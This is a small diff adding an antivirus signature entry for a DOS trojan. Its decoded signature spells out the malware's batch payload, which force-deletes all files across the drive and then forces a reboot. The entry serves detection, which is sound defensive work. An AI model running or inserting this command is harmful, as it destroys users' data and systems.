@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36619
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off del %alldrive%\*.* /f /s /q shutdown -r -f -t 00
